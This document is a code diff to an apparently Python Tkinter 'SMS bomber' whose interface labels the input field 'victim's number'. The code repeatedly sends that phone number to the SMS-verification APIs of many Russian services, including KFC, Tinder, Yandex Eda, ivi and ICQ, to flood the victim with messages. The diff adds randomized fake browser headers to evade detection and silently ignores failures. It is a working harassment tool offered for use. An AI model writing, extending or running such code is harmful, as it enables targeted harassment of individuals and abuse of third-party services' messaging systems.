@@ -1,6 +1,18 @@
 from tkinter import *
 import requests
+import random
 
+heads = [{'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
+           'Accept': '*/*'},
+           {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
+           'Accept': '*/*'},
+           {"User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
+           'Accept': '*/*'},
+           {'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
+           'Accept': '*/*'},
+           {"User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
+           'Accept': '*/*'},
+]
 
 class Main(Frame):
     def __init__(self, root):
@@ -22,15 +34,6 @@ name.place(x = 210, y = 10)
 def bomber(event):
     number = int(ent.get())
     sms = int(ent2.get())
-    def check_number(number):
-        try:
-            int(len(number)) == 10
-            int(number[0]) == 9 or 8
-            check = Label(root, text = "check number - OK")
-            check.place(x = 300, y = 100)
-        except:
-            check = Label(root, text = "неправильный номер")
-            check.place(x = 300, y = 100)
 
     def attack(number, sms):
         number_7 = str(7) + str(number)
@@ -38,59 +41,109 @@ def bomber(event):
         number_8 = str(8) + str(number)
         sent = 0
         while sent < sms:
-            wwork = requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": number_7, "type": 2})
+            HEADERS = random.choice(heads)
+            try:
+                wwork = requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": number_7, "type": 2})
+                sent += 1
+            except:
+                pass
 
-            sent += 1
+            try:
+                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7})
+                sent += 1
+            except:
+                pass
+            
+            try:
+                requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                utair = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/', headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                ok = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                youdrive = requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'},headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                eda = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                ivi = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                delimobile = requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3}, headers=HEADERS)
+                sent += 1
+            except:
+                pass
+            
+            try:
+                icq = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
+                sent += 1
+            except:
+                pass 
 
-            sun = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7})
-            
-            sent += 1
-            qlean = requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": number_7})
-            
-            sent += 1
-    
-            cloud = requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"})
-            
-            sent += 1
-         
-            kfc = requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7})
-            
-            sent += 1
-         
-            utair = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers = {})
-            
-            sent += 1
-            
-            tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers = {})
-            
-            sent += 1
-           
-            citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/')
-            
-            sent += 1
-            
-            ok = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7})
-
-            sent += 1
-            
-            rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': number}).json()["res"]
-            
-            sent += 1
-            
-            karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers = {})
-            
-            sent += 1
-            
-            youdrive = requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'}, headers = {})
-            
-            sent += 1
-            
-            mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers={})
-            
-            sent += 1
-            
-            youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers = {})
-    check_number(number)
     attack(number, sms)
 
 code = Label(root, text = "номер жертвы", fg = '#00ED00', bg = '#0C0C28', font = 'Helvetica 10 bold')
